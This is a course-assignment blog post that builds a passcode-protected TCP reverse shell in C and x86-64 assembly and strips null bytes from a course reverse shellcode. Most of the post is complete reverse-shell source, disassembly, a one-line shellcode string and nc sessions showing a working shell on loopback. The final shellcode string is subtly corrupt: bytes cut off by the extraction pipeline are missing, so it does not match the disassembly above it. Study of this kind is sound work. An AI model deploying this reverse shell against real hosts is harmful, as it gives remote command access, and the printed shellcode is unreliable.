---
title: "SLAE64 - Assignment #2 - TCP Reverse Shell"
tags: ["slae64", "assembly", "shellcode", "exploit-development"]
---

## Introduction

This is the blog post for the 2<sup>nd</sup> Assignment of the SLAE64 course, which is offered by <a href="https://www.pentesteracademy.com/course?id=7" target="_blank">PentesterAcademy</a>. The course focuses on teaching the basics of 64-bit Assembly language for the Intel Architecture (IA-x86_64) family of processors on the Linux platform.

The purpose of this assignment is to create a TCP Reverse Shell. A Reverse Shell has a listener running on the attacker and the target connects back to the attacker with a shell. The communication happens over the TCP protocol. Also, the attacker has to provide a passcode and if it's correct, then the shell gets executed.

Furthermore, the nullbytes (`0x00`) have to be removed from the Reverse Shellcode of the course. So, the table below is used to navigate to the 2 parts of the assignment.

| Part | Description | 
| -- | -- |
| [TCP Reverse Shell](#tcp-reverse-shell) | TCP Reverse Shell with passcode |
| [Reverse Shellcode](#reverse-shellcode) | Removing `0x00` from the Reverse Shellcode of the course |

My code can be found in my Github: <a href="https://github.com/geobour98/slae64" target="_blank">geobour98's Github</a>.

## TCP Reverse Shell {#tcp-reverse-shell}

### TCP Reverse Shell in C

The easiest way, in my opinion, to create a TCP Reverse Shell in `Assembly` is to first create it in `C` and then "translate" it to ASM code.

In order create the TCP Reverse Shell, a few Linux system calls (`syscalls`) will be used. They can be found in the following table:

| Syscall | Usage |
| -- | -- |
| `socket` | Creates an endpoint for communication |
| `connect` | Initializes a connection on a socket |
| `dup2` | Duplicates a file descriptor |
| `read` | Reads from a file descriptor |
| `execve` | Executes a program |
| `exit` | Terminates the calling process |

Declare the passcode that must be provided in order for the shell to be executed and its length:

```c
char *p = "Password";
int length = strlen(p);
```

Create a socket:

```c
int sockfd = socket(AF_INET, SOCK_STREAM, 0);
```

Initialize the connection on a socket, initializing the structure for the TCP/IP address first:

```c
struct sockaddr_in address = {
	.sin_family = AF_INET,
	.sin_port = htons(4444),
	.sin_addr = inet_addr("127.1.1.1")
};

connect(sockfd, (struct sockaddr*) &address, sizeof(address));
```

Duplicate STDIN, STDOUT and STDERR file descriptors in order to redirect everything to the socket connected:

```c
dup2(sockfd, 0);
dup2(sockfd, 1);
dup2(sockfd, 2);
```

Attempt to read up to 64 bytes from the connection:

```c
char pass[64];
read(sockfd, pass, 64);
```

Compare the passcode from the connection with the predefined and if they match execute the `/bin/sh` program. 

```c
if (strncmp(pass, p, length) == 0)
{
        execve("/bin/sh", NULL, NULL);
}
```

If the passcode from the connection doesn't match with the predefined terminate the program.

```c
else
{
        exit(-1);
}
```

The whole `C` program is the following:

```c
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>

int main(int argc, char **argv)
{

	char *p = "Password";
	int length = strlen(p);

	int sockfd = socket(AF_INET, SOCK_STREAM, 0);

	struct sockaddr_in address = {
		.sin_family = AF_INET,
		.sin_port = htons(4444),
		.sin_addr = inet_addr("127.1.1.1")
	};

	connect(sockfd, (struct sockaddr*) &address, sizeof(address));

	dup2(sockfd, 0);
        dup2(sockfd, 1);
        dup2(sockfd, 2);

	char pass[64];
	read(sockfd, pass, 64);
	
	if (strncmp(pass, p, length) == 0)
	{
		execve("/bin/sh", NULL, NULL);
	}
	else
	{
		exit(-1);
	}
	
	return 0;
}
```

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> **Syscall Arguments**
>
> The arguments and their values for the syscalls will be explained later in the creation of the TCP Reverse Shell in Assembly.
{: .prompt-warning }
<!-- markdownlint-restore -->

In order to prove that the Reverse Shell is working we have to compile the `C` program using the GNU Compiler (`gcc`):

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/2_Shell_reverse_tcp$ gcc reverse-c.c -o reverse-c
```

First, create a listener with `nc` on port `4444` and wait for connections:

```shell
geobour98@slae64-dev:~$ nc -lvnp 4444
```

Then, in another terminal execute `reverse-c`.

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/2_Shell_reverse_tcp$ ./reverse-c

```

In the first terminal verify the incoming connection, provide the passcode: `Password` and execute the commands `id` and `ls`.


```shell
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [127.0.0.1] port 4444 [tcp/*] accepted (family 2, sport 54242)
Password
id
uid=1000(geobour98) gid=1000(geobour98) groups=1000(geobour98),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
ls
compile.sh
reverse-c
reverse-c.c
reverse-shellcode-course
reverse-shellcode-course.nasm
reverse-shellcode-course.o
reverse.nasm
exit
geobour98@slae64-dev:~$
```

Now we can check that with a wrong passcode the program is terminated. We execute again `reverse-c` and listen with `nc`. The program is indeed terminated.

```shell
geobour98@slae64-dev:~$ nc -lvnp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [127.0.0.1] port 4444 [tcp/*] accepted (family 2, sport 54244)
WrongPassword
geobour98@slae64-dev:~$
```

### Syscalls

In order to implement the syscalls in Assembly, we have to find their defined numbers. These are located at the header file: `/usr/include/x86_64-linux-gnu/asm/unistd_64.h`.

The syscalls and their definitions can be found in the following table:

| Syscall | Definition |
| -- | -- |
| `socket` | `#define __NR_socket 41` |
| `connect` | `#define __NR_connect 42` |
| `dup2` | `#define __NR_dup2 33` |
| `read` | `#define __NR_read 0` |
| `execve` | `#define __NR_execve 59` |
| `exit` | `#define __NR_exit 60` |

Now we have to find the arguments and their values in order to be used in the syscalls.

- Syscall `socket`:

```shell
int socket(int domain, int type, int protocol);
```

The `domain` argument specifies a communication domain. Since we operate through IPv4 protocol, we will use the `AF_INET` address family, which according to the socket header file: `/usr/include/x86_64-linux-gnu/bits/socket.h` belongs to the `PF_INET` protocol family. This protocol family is represented by the number `2`.

The `type` argument specifies the communication semantics. We will use `SOCK_STREAM`, since it provides sequenced, reliable, two-way, connection-based byte streams. According to the socket_type header file: `/usr/include/x86_64-linux-gnu/bits/socket_type.h`, `SOCK_STREAM` is represented by the number `1`.

The `protocol` argument specifies a particular protocol to be used with the socket. Normally only a single protocol exists to support a particular socket type within a given protocol family, in which case `protocol` can be specified as `0`.

The return value from `socket` is a file descriptor for the new socket, if socket was executed successfully.

- Syscall `connect`:

```shell
int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
```   

The `sockfd` argument is the file descriptor returned from `socket` execution. It is an integer value.

The `*addr` argument is the address structure that will be assigned to the socket. The structure consists of 3 values. The first value is the `AF_INET`, which from before is the number `2`. The second value is the port that the target will be connected to, which in our case is `4444`. The third value is the interface that the socket will connect to. We provide the value `127.1.1.1` in order to connect to the loopback interface (`127.0.0.0/8`). Note that we avoid addresses like `127.0.0.1` (that contain `0`), so we don't have nullbytes in the shellcode.

The `addrlen` argument is the size, in bytes, of the address structure pointed to by `addr`. According to the header file: `/usr/include/linux/in.h` the size is `16` bytes.

- Syscall `dup2`:

```shell
int dup2(int oldfd, int newfd);
```

The argument `oldfd` is the integer returned from `socket`.

If the descriptor `newfd` was previously open, it is silently closed before being reused. If `oldfd` is a valid file descriptor, and `newfd` has the same value as `oldfd`, then `dup2` does nothing, and returns `newfd`. We execute `dup2` 3 times in order to pass the values: `0` for `STDIN`, `1` for `STDOUT` and `2` for `STDERR`.

On success `dup2` returns the new descriptor.

- Syscall `read`:

```shell
ssize_t read(int fd, void *buf, size_t count);
```

The `fd` argument is the return value from the `socket` syscall, which is an integer

The `*buf` argument is the buffer, where the bytes from the file descriptor are stored.

The `count` argument is the maximum number of bytes that will be read from the file descriptor.

On success `read` returns the number of bytes read.

- Syscall `execve`:

```shell
int execve(const char *filename, char *const argv[], char *const envp[]);
```

The `*filename` argument must be either a binary executable or a script, so we pass to it the executable "bin/sh".

The `argv` argument is an array of argument strings passed to the new program. The `envp` argument is an array of strings, conventionally of the form "key=value", which are passed as environment to the new program. Since we don't need any of these we pass the value `NULL`. 

- Syscall `exit`:

```shell
void _exit(int status);
```

The `status` argument is returned to the parent process as the process's exit status, which in our case is `-1`, declaring that the program terminated unsuccessfully when the passcode is wrong.

### TCP Reverse Shell in Assembly

Now we will examine the `Assembly` instructions in detail.

- Syscall `socket`

We first clear the register `RAX` and then add to it the hexadecimal value `0x29`, which in decimal is `41`.

```nasm
	xor rax, rax
    add al, 0x29            ; 29 is the hex value of the decimal 41 for socket
```

Then we clear the `RDI` register and add to it the value `2`, since it is the `PF_INET` protocol family.

```nasm
    xor rdi, rdi
    add rdi, 0x2            ; AF_INET numeric value from PF_INET protocol family
```

After that, we clear the `RSI` register and add to it the value `1`, since this is the value of `SOCK_STREAM` constant.

```nasm
    xor rsi, rsi
    add rsi, 0x1            ; SOCK_STREAM constant from socket_type.h
```

We clear the `RDX` register and the value `0`, because of the single protocol, is passed as the third argument to `socket` syscall.

```nasm
    xor rdx, rdx            ; 0 value because of single protocol
```

Then, in order to actulally execute the syscall, we run the following instruction:

```nasm
    syscall                 ; exec socket syscall
```

The `socket` syscall returns a file descriptor (`sockfd`), so we copy it to the `RDI` register, since the result of the syscall is saved in the `RAX` register by default.

```nasm
    mov rdi, rax            ; move sockfd (file descriptor) value into rdi
```

- Syscall `connect`

We clear the `RAX` register and push the value `0` to the stack.

```nasm
    xor rax, rax
    push rax
```

We start with the values for the `address` structure.

We move the hexadecimal value `0x0101017f`, which is the address `127.1.1.1` in little endian representation, where `RSP` points minus 4 bytes so the socket connects to the loopback interface (`127.0.0.0/8`).

```nasm
    mov dword [rsp - 4], 0x0101017f         ; connect to localhost (127.1.1.1) (little endian)
```

Then, since we are dealing with little endianness the port with decimal value `4444` and hexadecimal `115c`, becomes `5c11`.

```nasm
    mov word [rsp - 6], 0x5c11      ; listen on port 4444 (little endian)
```

After that, we move the value `2`, where `RSP` points minus 8 bytes, for the `AF_INET` constant.

```nasm
    mov byte [rsp - 8], 0x2         ; AF_INET constant
```

We restore `RSP` register that now points at the top of the stack.

```nasm
    sub rsp, 8              ; rsp points at the top of the stack
```

We add the hexadecimal value `0x2a`, which in decimal is `42`, for the `connect` syscall.

```nasm
    add al, 0x2a    ; 2a is the hex value of the decimal 42 for connect
```

The `RDI` register already contains the value of `sockfd` from `socket`.

The `RSI` register now points at the top of the stack, where is the address struct.

```nasm
    mov rsi, rsp            ; rsi now points at address struct at the top of the stack
```

We clear the `RDX` register, and pass the hexadecimal value `0x10` (`16` in decimal), since that is the size of the address struct.

```nasm
    xor rdx, rdx
    add rdx, 0x10           ; 10 is the decimal 16 that is the size of the address struct
```

The final step is to execute the `connect` syscall.

```nasm
    syscall                 ; exec connect syscall
```

- Syscall `dup2`

The `RDI` register already contains the value of `sockfd` from `socket`.

We create a loop that will execute `dup2` 3 times for `STDERR`, `STDOUT` and `STDIN` respectively. So, we clear the `RSI` register and add the value `0x3` to it, which is the counter for the loop.

```nasm
	xor rsi, rsi
	add rsi, 0x3		; set counter to 3
```

We first declare the procedure `dup2loop`, which acts like a function, where we clear the `RAX` register and add the hexadecimal value `0x21` (`33` in decimal) to it as the `dup2` syscall number. Then, we decrement the counter (`RSI`) by 1, so in the first iteration the value inside `RSI` will be `2`, representing the `STDERR`. 2 more iterations will happen with value `1` and `0` for `STDOUT` and `STDIN` respectively. Each iteration is finished by executing the `dup2` syscall and by creating a conditional instruction. That instruction checks if the Zero Flag (`ZF`) is set, meaning it has value `0`, and if it is, the loop is stopped and the execution is continued. If it is not `0` a `jump` happens back to `dup2loop`. In the third iteration, `RSI` is decremented to `0`, so the `ZF` is set, and the execution will continue to the next instructions and there will not be a jump back to `dup2loop`.

```nasm
dup2loop:
        xor rax, rax
        add al, 0x21            ; 21 is the hex value of the decimal 33 for dup2

        dec rsi                 ; decrement counter by 1

        syscall                 ; exec dup2 syscall

        jnz dup2loop            ; jump to loop if ZF is not zero, else continue
```

- Syscall `read`

We clear the `RAX` register in order to have the value `0` as the `read` syscall number and `RSI` points at the top of the stack.

```nasm
        xor rax, rax            ; 0 for read syscall

        mov rsi, rsp
``` 

We clear the `RDX` register and add to it the value `8` as the size of the password that is going to be read.

```nasm
    xor rdx, rdx
    add dl, 8               ; read size
```

Finally, we execute the `read` syscall.

```nasm
    syscall                 ; exec read syscall
```

`RDI` register points at the top of the stack, where the provided password is from the `read` syscall.

```nasm
    mov rdi, rsp                    ; password in buffer
```

Now we have to pass the correct passcode, which is `Password`, to `RAX` in order to compare it with the one from `read` syscall. But we have to pass it in reverse since we are dealing with little endianness. The following `python` script will help us achieve that.

```python
#!/usr/bin/python

import sys

input = sys.argv[1]

print 'String length: ' + str(len(input))

stringList = [input[i:i+8] for i in range(0, len(input), 8)]

for item in stringList[::-1]:
	print item[::-1] + ' : ' + str(item[::-1].encode('hex'))
```

We run the above script by providing the correct password (`Password`) we want to be reversed.

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/2_Shell_reverse_tcp$ ./reverse.py Password
String length: 8
drowssaP : 64726f7773736150
```

Now we move that value to the `RAX` register.

```nasm
    mov rax, 0x64726f7773736150     ; "drowssaP"
```

Next, we are using the `scasq` instruction, which compares memory to register. The value in memory is the buffer with the password from the `read` syscall and the register that is compared is `RAX` by default, where we have stored the correct passcode.

```nasm
    scasq                           ; compare string in buffer with passcode
```

If the 2 values are the same, the provided passcode matches with the correct one, the Zero Flag (`ZF`) is set. So, the next instruction is ignored and the `execve` syscall is executed. If they don't match, which means that the passcode is wrong, we jump to the `exit` procedure.

```nasm
    jnz exit                        ; if they don't match jmp to exit
```

- Syscall `exit`

We clear the `RAX` register and add to it the hex value `0x3c` (`60` in decimal) as the `exit` syscall number.

```nasm
exit:
    xor rax, rax
    add rax, 0x3c           ; 3c is the hex value of the decimal 60 for exit
```

Then, we clear the `RDI` register and decrement its value to `-1` in order to set the status and exit the program unsuccessfully.

```nasm
    xor rdi, rdi
    dec rdi                 ; status
```

Finally, we execute the `exit` syscall.

```nasm
    syscall                 ; exec exit syscall
```

- Syscall `execve`

We clear the `RAX` register and push the value `0` to the stack.

```nasm
    xor rax, rax
    push rax
```

Since "/bin/sh" is only 7 bytes, we need to make it 8 bytes. That is because when a string is pushed to the stack it must be multiplied by 8. The safest way to do that, without breaking any functionality, is to add a `/`. So we will use the same `python` script like before to reverse the "/bin//sh" string.

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/2_Shell_reverse_tcp$ ./reverse.py "/bin//sh"
String length: 8
hs//nib/ : 68732f2f6e69622f
```

Now we save that in `RBX` register and then push it to the stack.

```nasm
    mov rbx, 0x68732f2f6e69622f     ; "hs//nib/"
    push rbx
```

`RDI` points at the top of the stack, where is the string "/bin//sh" as the first argument for `execve`.

```nasm
    mov rdi, rsp            ; rdi points at "/bin//sh" at the top of the stack
```

Then, we push another `NULL` and save the current `RSP` memory address to `RDX` as the third argument from `execve`.

```nasm
    push rax                ; NULL

    mov rdx, rsp            ; rdx points at the top of the stack
```

We push the memory address of the string "/bin//sh" to the stack and save that memory location to `RSI` as the second argument for `execve`.

```nasm
    push rdi

    mov rsi, rsp
```

We add to `RAX` the hex value `0x3b` (`59` in decimal) as the syscall number for `execve`.

```nasm
    add al, 0x3b            ; 3b is the hex value of the decimal 59 for execve
```

Finally, we execute the `execve` syscall.

```nasm
    syscall                 ; exec execve syscall
```

The whole `Assembly` program is the following:

```nasm
global _start

_start:
	
	; socket
	xor rax, rax
	mov al, 0x29	; 29 is the hex value of the decimal 41 for socket
	
	xor rdi, rdi
	add rdi, 0x2	; AF_INET numeric value from PF_INET protocol family
	
	xor rsi, rsi
	add rsi, 0x1	; SOCK_STREAM constant from socket_type.h
	
	xor rdx, rdx	; 0 value because of single protocol
	
	syscall		; exec socket syscall

	mov rdi, rax	; move sockfd (file descriptor) value into rdi

	; connect
	xor rax, rax
	push rax

	mov dword [rsp - 4], 0x0101017f		; connect to localhost (127.1.1.1) (little endian)

	mov word [rsp - 6], 0x5c11		; connect to port 4444 (little endian)

	mov byte [rsp - 8], 0x2			; AF_INET constant
	
	sub rsp, 8				; rsp points at the top of the stack
	
	add al, 0x2a	; 2a is the hex value of the decimal 42 for connect
	
	mov rsi, rsp	; rsi now points at address struct at the top of the stack
	
	xor rdx, rdx
	add rdx, 0x10	; 10 is the decimal 16 that is the size of the address struct

	syscall		; exec connect syscall

	; dup2
	xor rsi, rsi
	add rsi, 0x3	; set counter to 3

dup2loop:
	xor rax, rax	
	add al, 0x21	; 21 is the hex value of the decimal 33 for dup2

	dec rsi		; decrement counter by 1
	
	syscall		; exec dup2 syscall

	jnz dup2loop	; jump to loop if ZF is not zero, else continue

	; read
	xor rax, rax	; 0 for read syscall

	mov rsi, rsp

	xor rdx, rdx
	add dl, 8	; read size

	syscall		; exec read syscall

	mov rdi, rsp			; password in buffer

	mov rax, 0x64726f7773736150	; "drowssaP"

	scasq				; compare string in buffer with passcode
	jnz exit			; if they don't match jmp to exit

	; execve
	xor rax, rax
	push rax

	mov rbx, 0x68732f2f6e69622f	; "hs//nib/"
	push rbx

	mov rdi, rsp			; rdi points at "/bin//sh" at the top of the stack

	push rax			; NULL

	mov rdx, rsp			; rdx points at the top of the stack

	push rdi
	
	mov rsi, rsp

	add rax, 0x3b			; 3b is the hex value of the decimal 59 for execve

	syscall				; exec execve syscall

exit:
	xor rax, rax	
	add rax, 0x3c	; 3c is the hex value of the decimal 60 for exit

	xor rdi, rdi
	dec rdi		; status

	syscall		; exec exit syscall
```

## Testing the Reverse Shell

In order to test the Reverse Shell, we need to compile it. Compilation process consists of 2 separate processes:

- Assembling: can happen with the `nasm` assembler, which assembles the input file (`.nasm`) and directs output to the output file (`.o`) if specified. It basically "translates" the `Assembly` code.
- Linking: can happen with the GNU linker `ld`, which combines a number of object and archive files, relocates their data and ties up symbol references. It basically provides information such as where the entry point of a program is. By default the entry point is `_start` but this can be changed.

The following `bash` script automates that process:

```bash
#!/bin/bash

echo '[+] Assembling with Nasm ... '
nasm -felf64 -o $1.o $1.nasm

echo '[+] Linking ... '
ld -o $1 $1.o

echo '[+] Done!'
```

The following command does the compilation and creates the executable `reverse`:

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/2_Shell_reverse_tcp$ ./compile.sh reverse
[+] Assembling with Nasm ... 
[+] Linking ... 
[+] Done!
```

We test the Reverse Shell by creating a listener on port `4444` with `nc` in one terminal window and in another we execute the executable `reverse`. Then, back to the first we verify the incoming connection, provide the passcode: `Password` and execute the commands `id` and `ls`.

1<sup>st</sup> window:

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/2_Shell_reverse_tcp$ nc -lvnp 4444
```

2<sup>nd</sup> window:

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/2_Shell_reverse_tcp$ ./reverse

```

1<sup>st</sup> window again:

```shell
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [127.0.0.1] port 4444 [tcp/*] accepted (family 2, sport 46224)
Password
id
uid=1000(geobour98) gid=1000(geobour98) groups=1000(geobour98),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
ls
compile.sh
reverse
reverse-c
reverse-c.c
reverse-shellcode-course
reverse-shellcode-course.nasm
reverse-shellcode-course.o
reverse.nasm
reverse.o
reverse.py
exit
geobour98@slae64-dev:~/SLAE/custom/SLAE64/2_Shell_reverse_tcp$
```

Now we can check that with a wrong passcode the program is terminated. We execute again `reverse` and listen with `nc`. The program is indeed terminated.

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/2_Shell_reverse_tcp$ nc -lvnp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [127.0.0.1] port 4444 [tcp/*] accepted (family 2, sport 46226)
WrongPassword
geobour98@slae64-dev:~/SLAE/custom/SLAE64/2_Shell_reverse_tcp$
```

## Reverse Shellcode {#reverse-shellcode} 

The initial version of the Reverse Shellcode of the course, which contained nullbytes, is the following:

```nasm
global _start

_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41

	mov rax, 41
	mov rdi, 2
	mov rsi, 1
	mov rdx, 0
	syscall

	; copy socket descriptor to rdi for future use
	mov rdi, rax

	; server.sin_family = AF_INET
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = INADDR_ANY
	; bzero(&server.sin_zero, 8)

	xor rax, rax

	push rax

	mov dword [rsp - 4], 0x0100007f
	mov word [rsp - 6], 0x5c11
	mov word [rsp - 8], 0x2
	sub rsp, 8

	; connect(sock, (struct sockaddr *)&server, sockaddr_len)

	mov rax, 42
	mov rsi, rsp
	mov rdx, 16
	syscall

	; duplicate sockets
	; dup2 (new, old)
	mov rax, 33
	mov rsi, 0
	syscall

	mov rax, 33
	mov rsi, 1
	syscall

	mov rax, 33
	mov rsi, 2
	syscall

	; first null push
	xor rax, rax
	push rax

	; push /bin//sh in reverse
	mov rbx, 0x68732f2f6e69622f
	push rbx

	; store /bin//sh address in RDI
	mov rdi, rsp

	; second null push
	push rax

	; set RDX
	mov rdx, rsp

	; push address pf /bin//sh
	push rdi
	
	; set RSI
	mov rsi, rsp

	; call execve
	add rax, 59
	syscall
```

In order to view those `0x00` we compile `reverse-shellcode-course.nasm` and use the `objdump` program, which displays information from object files, by displaying assembler contents and instructions in Intel syntax.

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/2_Shell_reverse_tcp$ ./compile.sh reverse-shellcode-course
[+] Assembling with Nasm ... 
[+] Linking ... 
[+] Done!
geobour98@slae64-dev:~/SLAE/custom/SLAE64/2_Shell_reverse_tcp$ objdump -d ./reverse-shellcode-course -M intel

./reverse-shellcode-course:     file format elf64-x86-64


Disassembly of section .text:

0000000000400080 <_start>:
  400080:	b8 29 00 00 00       	mov    eax,0x29
  400085:	bf 02 00 00 00       	mov    edi,0x2
  40008a:	be 01 00 00 00       	mov    esi,0x1
  40008f:	ba 00 00 00 00       	mov    edx,0x0
  400094:	0f 05                	syscall 
  400096:	48 89 c7             	mov    rdi,rax
  400099:	48 31 c0             	xor    rax,rax
  40009c:	50                   	push   rax
  40009d:	c7 44 24 fc 7f 00 00 	mov    DWORD PTR [rsp-0x4],0x100007f
  4000a4:	01 
  4000a5:	66 c7 44 24 fa 11 5c 	mov    WORD PTR [rsp-0x6],0x5c11
  4000ac:	66 c7 44 24 f8 02 00 	mov    WORD PTR [rsp-0x8],0x2
  4000b3:	48 83 ec 08          	sub    rsp,0x8
  4000b7:	b8 2a 00 00 00       	mov    eax,0x2a
  4000bc:	48 89 e6             	mov    rsi,rsp
  4000bf:	ba 10 00 00 00       	mov    edx,0x10
  4000c4:	0f 05                	syscall 
  4000c6:	b8 21 00 00 00       	mov    eax,0x21
  4000cb:	be 00 00 00 00       	mov    esi,0x0
  4000d0:	0f 05                	syscall 
  4000d2:	b8 21 00 00 00       	mov    eax,0x21
  4000d7:	be 01 00 00 00       	mov    esi,0x1
  4000dc:	0f 05                	syscall 
  4000de:	b8 21 00 00 00       	mov    eax,0x21
  4000e3:	be 02 00 00 00       	mov    esi,0x2
  4000e8:	0f 05                	syscall 
  4000ea:	48 31 c0             	xor    rax,rax
  4000ed:	50                   	push   rax
  4000ee:	48 bb 2f 62 69 6e 2f 	movabs rbx,0x68732f2f6e69622f
  4000f5:	2f 73 68 
  4000f8:	53                   	push   rbx
  4000f9:	48 89 e7             	mov    rdi,rsp
  4000fc:	50                   	push   rax
  4000fd:	48 89 e2             	mov    rdx,rsp
  400100:	57                   	push   rdi
  400101:	48 89 e6             	mov    rsi,rsp
  400104:	48 83 c0 3b          	add    rax,0x3b
  400108:	0f 05                	syscall
```

The majority of the changes were to convert an instruction: `mov rax, 41` to 2 instructions: `xor rax, rax` and `add al, 41` in order to remove nullbytes and preserve the functionality. So, the updated version (`reverse-shellcode-course.nasm`) is the following:

```nasm
global _start

_start:

	mov al, 41
	xor rdi, rdi
	add rdi, 2
	xor rsi, rsi
	add rsi, 1
	xor rdx, rdx
	syscall

	mov rdi, rax

	xor rax, rax

	push rax

	mov dword [rsp - 4], 0x0101017f
	mov word [rsp - 6], 0x5c11
	mov byte [rsp - 8], 0x2
	sub rsp, 8

	add rax, 42
	mov rsi, rsp
	xor rdx, rdx
	add rdx, 16
	syscall

	xor rax, rax	
	add rax, 33
	xor rsi, rsi
	syscall

	xor rax, rax
	add rax, 33
	add rsi, 1
	syscall

	xor rax, rax
	add rax, 33
	add rsi, 1
	syscall

	xor rax, rax
	push rax

	mov rbx, 0x68732f2f6e69622f
	push rbx

	mov rdi, rsp

	push rax

	mov rdx, rsp

	push rdi
	
	mov rsi, rsp

	add rax, 59
	syscall
```

After compilation and execution of the `objdump` program we can see that there are no nullbytes.

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/2_Shell_reverse_tcp$ ./compile.sh reverse-shellcode-course
[+] Assembling with Nasm ... 
[+] Linking ... 
[+] Done!
geobour98@slae64-dev:~/SLAE/custom/SLAE64/2_Shell_reverse_tcp$ objdump -d ./reverse-shellcode-course -M intel

./reverse-shellcode-course:     file format elf64-x86-64


Disassembly of section .text:

0000000000400080 <_start>:
  400080:	b0 29                	mov    al,0x29
  400082:	48 31 ff             	xor    rdi,rdi
  400085:	48 83 c7 02          	add    rdi,0x2
  400089:	48 31 f6             	xor    rsi,rsi
  40008c:	48 83 c6 01          	add    rsi,0x1
  400090:	48 31 d2             	xor    rdx,rdx
  400093:	0f 05                	syscall 
  400095:	48 89 c7             	mov    rdi,rax
  400098:	48 31 c0             	xor    rax,rax
  40009b:	50                   	push   rax
  40009c:	c7 44 24 fc 7f 01 01 	mov    DWORD PTR [rsp-0x4],0x101017f
  4000a3:	01 
  4000a4:	66 c7 44 24 fa 11 5c 	mov    WORD PTR [rsp-0x6],0x5c11
  4000ab:	c6 44 24 f8 02       	mov    BYTE PTR [rsp-0x8],0x2
  4000b0:	48 83 ec 08          	sub    rsp,0x8
  4000b4:	48 83 c0 2a          	add    rax,0x2a
  4000b8:	48 89 e6             	mov    rsi,rsp
  4000bb:	48 31 d2             	xor    rdx,rdx
  4000be:	48 83 c2 10          	add    rdx,0x10
  4000c2:	0f 05                	syscall 
  4000c4:	48 31 c0             	xor    rax,rax
  4000c7:	48 83 c0 21          	add    rax,0x21
  4000cb:	48 31 f6             	xor    rsi,rsi
  4000ce:	0f 05                	syscall 
  4000d0:	48 31 c0             	xor    rax,rax
  4000d3:	48 83 c0 21          	add    rax,0x21
  4000d7:	48 83 c6 01          	add    rsi,0x1
  4000db:	0f 05                	syscall 
  4000dd:	48 31 c0             	xor    rax,rax
  4000e0:	48 83 c0 21          	add    rax,0x21
  4000e4:	48 83 c6 01          	add    rsi,0x1
  4000e8:	0f 05                	syscall 
  4000ea:	48 31 c0             	xor    rax,rax
  4000ed:	50                   	push   rax
  4000ee:	48 bb 2f 62 69 6e 2f 	movabs rbx,0x68732f2f6e69622f
  4000f5:	2f 73 68 
  4000f8:	53                   	push   rbx
  4000f9:	48 89 e7             	mov    rdi,rsp
  4000fc:	50                   	push   rax
  4000fd:	48 89 e2             	mov    rdx,rsp
  400100:	57                   	push   rdi
  400101:	48 89 e6             	mov    rsi,rsp
  400104:	48 83 c0 3b          	add    rax,0x3b
  400108:	0f 05                	syscall
```

The updated reverse shellcode can be seen below in one line:

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/2_Shell_reverse_tcp$ objdump -d ./reverse-shellcode-course |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\xb0\x29\x48\x31\xff\x48\x83\xc7\x02\x48\x31\xf6\x48\x83\xc6\x01\x48\x31\xd2\x0f\x05\x48\x89\xc7\x48\x31\xc0\x50\xc7\x44\x24\xfc\x7f\x01\x01\x66\xc7\x44\x24\xfa\x11\xc6\x44\x24\xf8\x02\x48\x83\xec\x08\x48\x83\xc0\x2a\x48\x89\xe6\x48\x31\xd2\x48\x83\xc2\x10\x0f\x05\x48\x31\xc0\x48\x83\xc0\x21\x48\x31\xf6\x0f\x05\x48\x31\xc0\x48\x83\xc0\x21\x48\x83\xc6\x01\x0f\x05\x48\x31\xc0\x48\x83\xc0\x21\x48\x83\xc6\x01\x0f\x05\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"
```

Also, in order to prove the functionality of the reverse shell we create a listener on port `4444` with `nc` in one terminal window and in another we execute the reverse executable. Then, back to the first we verify the incoming connection and run the commands `id` and `ls`.

1<sup>st</sup> window:

```shell
geobour98@slae64-dev:~$ nc -lvnp 4444
```

2<sup>nd</sup> window:

```shell
geobour98@slae64-dev:~/SLAE/custom/SLAE64/2_Shell_reverse_tcp$ ./reverse-shellcode-course 

```

1<sup>st</sup> window again:

```shell
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [127.0.0.1] port 4444 [tcp/*] accepted (family 2, sport 54234)
id
uid=1000(geobour98) gid=1000(geobour98) groups=1000(geobour98),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
ls
compile.sh
reverse-c
reverse-c.c
reverse-shellcode-course
reverse-shellcode-course.nasm
reverse-shellcode-course.o
reverse.nasm
exit
geobour98@slae64-dev:~$
```

## Summary

We have a working TCP Reverse Shell that connects to port 4444, waits for the correct passcode and if we provide the correct one, we can execute commands. Also, the nullbytes have been removed from the Reverse Shellcode of the course. 

Next will be the Egg Hunter shellcode!

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> **SLAE64 Blog Post**
>
> This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
> 
> https://www.pentesteracademy.com/course?id=7
>
> ~~http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/~~
>
